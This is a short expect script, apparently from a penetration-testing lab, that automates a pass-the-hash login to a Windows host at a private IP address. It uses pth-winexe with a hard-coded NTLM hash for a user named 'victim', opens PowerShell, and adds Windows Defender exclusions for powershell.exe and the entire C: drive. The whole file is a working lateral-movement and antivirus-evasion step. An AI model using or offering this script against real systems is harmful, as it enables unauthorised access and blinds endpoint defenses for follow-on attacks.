#!/usr/bin/expect

spawn /usr/bin/pth-winexe -U victim%aad3b435b51404eeaad3b435b51404ee:d00e5d238213d590200fcf3e6f3cd13c //192.168.57.25 --uninstall  powershell.exe

expect "PS"
send "Set-MpPreference -ExclusionProcess powershell.exe \n"
send "Set-MpPreference -ExclusionPath C:\ \n"
send "exit \n"

interact
